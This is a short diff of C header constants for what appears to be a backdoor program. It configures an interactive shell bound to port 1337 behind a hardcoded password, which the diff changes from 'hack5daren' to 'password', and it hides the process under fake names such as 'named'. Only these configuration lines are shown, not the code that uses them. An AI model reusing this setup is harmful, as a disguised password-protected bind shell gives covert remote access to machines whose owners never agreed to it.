@@ -14,7 +14,7 @@
 
 #define	SHELL	"/bin/sh"		// shell to run
 #define	SARG	"-i"			// shell parameters
-#define	PASSWD	"hack5daren"		// password (8 chars)
+#define	PASSWD	"password"		// password (8 chars)
 #define	PORT	1337			// port to bind shell
 #define	FAKEPS	"named"			// process fake name
 #define	SHELLPS	"sh"			// shells fake name
